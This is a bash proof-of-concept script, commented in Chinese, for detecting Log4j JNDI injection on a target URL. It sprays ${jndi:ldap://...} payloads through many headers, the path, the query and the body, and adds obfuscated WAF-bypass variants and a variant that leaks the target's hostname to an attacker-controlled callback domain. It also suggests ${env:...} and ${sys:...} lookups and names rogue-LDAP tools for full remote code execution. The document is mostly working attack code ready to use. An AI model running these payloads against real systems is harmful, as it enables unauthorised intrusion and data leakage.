#!/usr/bin/env bash
# ============================================================================
# Log4j JNDI 无害探测（多注入位 + 嵌套绕过）
# 用法: ./poc.sh https://TARGET oast.example.com
#       ./poc.sh https://TARGET/api/login oast.example.com POST '{"u":"PAYLOAD"}'
#
# 【为什么要多注入位】
#   Log4j 的 lookup 发生在**日志记录时**，而日志记录点遍布全应用。
#   常见被记录的位置（按命中率排序）：
#     User-Agent > X-Forwarded-For > Referer > X-Api-Version >
#     X-Forwarded-Host > Cookie > 请求参数 > 路径段 > 表单体
#   很多系统对 UA 做了清洗但漏了 X-Api-Version 之类的小众头。
#
# 【判据】只用 DNS 回连，不用 LDAP/RMI
#   - DNS 回连证明「表达式被求值」= 漏洞成立
#   - 不落地任何 payload，不触发远程类加载
#   - 回连域名里带唯一标记，能区分是哪个注入位触发的
#
# 【常见误报】
#   1. 目标自己会访问你的域名（比如反代健康检查）→ 用随机子域 + 只在探针发出后 30s 内有效
#   2. WAF 拦截返回 403，你没看到回连就判「无漏洞」→ 错。要记录 WAF 拦截情况
#   3. DNS 有缓存，多次探测会乱 → 每个位置用不同子域
#   4. 目标 log4j 版本 >= 2.17 且禁用了 jndi → 无回连是正常的，此时试 ${java:version} 类本地 lookup
# ============================================================================
set -uo pipefail
source "$(dirname "$0")/../_lib/common.sh"

URL="${1:-}"; OAST="${2:-}"
[ -z "$URL" ] || [ -z "$OAST" ] && usage_die "$0 <URL> <your-oast-domain> [METHOD] [body-with-PAYLOAD]"
METHOD="${3:-GET}"; BODY="${4:-}"
preflight || exit 1

RUN="$(date +%s)$RANDOM"
log "本次标记: $RUN  OAST: $OAST"

# 构造 payload 变体（针对不同版本的拦截）
make_payloads() {  # make_payloads <tag>
  local t="$1"
  cat <<EOF
jndi:ldap://$t.$OAST/a
jndi:ldaps://$t.$OAST/a
jndi:dns://$t.$OAST
jndi:rmi://$t.$OAST/a
\${jndi:ldap://$t.$OAST/a}
\${jndi:ldap://$t.\${\${hostName:-x}.}$OAST/a}
\${j\${::-n}di:ldap://$t.$OAST/a}
\${jndi:\${lower:l}dap://$t.$OAST/a}
\${jndi:ldap://$OAST/a}  # 无子域对照（判断是否只是泛解析）
EOF
}

# 注入位定义: name|curl-args
POSITIONS=(
  "User-Agent|-H 'User-Agent: PAYLOAD'"
  "X-Forwarded-For|-H 'X-Forwarded-For: PAYLOAD'"
  "X-Api-Version|-H 'X-Api-Version: PAYLOAD'"
  "X-Forwarded-Host|-H 'X-Forwarded-Host: PAYLOAD'"
  "Referer|-H 'Referer: PAYLOAD'"
  "Origin|-H 'Origin: PAYLOAD'"
  "Cookie|-H 'Cookie: sid=PAYLOAD'"
  "X-Client-IP|-H 'X-Client-IP: PAYLOAD'"
  "X-Real-IP|-H 'X-Real-IP: PAYLOAD'"
  "X-Requested-With|-H 'X-Requested-With: PAYLOAD'"
  "Accept-Language|-H 'Accept-Language: PAYLOAD'"
  "Authorization|-H 'Authorization: Bearer PAYLOAD'"
  "路径段|PATH"
  "查询参数|QUERY"
  "请求体|BODY"
)

echo
log "开始注入（每个位置独立标记，便于定位来源）"
declare -a SENT
i=0
for row in "${POSITIONS[@]}"; do
  name="${row%%|*}"; spec="${row#*|}"
  i=$((i+1))
  tag="${RUN}p${i}"
  payload="${tag}.${OAST}"

  case "$spec" in
    PATH)
      req GET "${URL%/}/%24%7Bjndi:ldap://$tag.$OAST/a%7D" >/dev/null
      ;;
    QUERY)
      sep='?'; case "$URL" in *\?*) sep='&' ;; esac
      req GET "${URL}${sep}q=\${jndi:ldap://$payload/a}" >/dev/null
      ;;
    BODY)
      if [ -n "$BODY" ]; then
        req POST "$URL" -H 'Content-Type: application/json' \
          --data-binary "${BODY//PAYLOAD/\${jndi:ldap://$payload/a}}" >/dev/null
      fi
      ;;
    *)
      # 用 eval 构造 curl 参数（spec 是受控字符串，不是外部输入）
      eval "req $METHOD \"\$URL\" ${spec//PAYLOAD/\$payload}" >/dev/null
      ;;
  esac
  SENT+=("$i|$name|$tag")
  dim "  [$i] $name → $tag"
  sleep 0.3
done

# 再对 UA 发一轮变体（最可能命中的位置）
log "UA 位置发送变体 payload（针对 WAF 绕过）"
vi=0
while IFS= read -r vp; do
  case "$vp" in \#*|"") continue ;; esac
  vi=$((vi+1))
  tag="${RUN}v${vi}"
  req GET "$URL" -H "User-Agent: ${vp//\$OAST/$OAST}" >/dev/null
  SENT+=("v$vi|UA-变体$vi|$tag")
  dim "  变体 $vi: ${vp:0:60}"
  sleep 0.3
done < <(make_payloads "$RUN")

# ---- 结论 ----------------------------------------------------------------
echo
cat <<EOF
════ 待确认 ════
  本次发出 ${#SENT[@]} 个探针，全部带唯一标记前缀 "$RUN"。

现在去 OAST 平台看有没有回连，重点关注:
  1. 有没有任何一条来自目标 IP 的 DNS 查询（只要有，漏洞成立）
  2. 标记前缀 $RUN 的后缀能定位到具体是哪个注入位:
     $(for s in "${SENT[@]}"; do printf '\n       %-6s → %s' "${s#*|}"; done | head -40)

════ 判读 ════
  有回连 + 标记匹配           → 确认 Log4j RCE（下一步才是构造 LDAP 服务）
  有回连 + 无子域对照也回连    → 你的 OAST 被泛解析了，换一个域名重测
  无回连 + 目标返回 200        → 要么打了补丁(>=2.17)，要么 jndi 被禁用
  无回连 + 目标返回 403/406    → WAF 拦了，记录拦截头，换编码再试

════ 补丁版本的判定（回连失败不等于安全）════
  用「本地 lookup」看是否还有表达式求值能力（不回外网）:
    \${java:version}   → 若响应里出现 "Java version" 说明求值仍然存在
    \${sys:user.dir}   → 泄露工作目录
    \${env:JAVA_HOME}
  这些不涉及 JNDI，能区分「求值被禁」和「JNDI 被禁」。

════ 注意 ════
  本脚本不搭建 LDAP/RMI 服务，也不加载远程类。
  真正的利用需要另外起 rogue LDAP（marshalsec / JNDIExploit），
  那一步会产生实际的类加载流量，必须先确认授权范围。
EOF
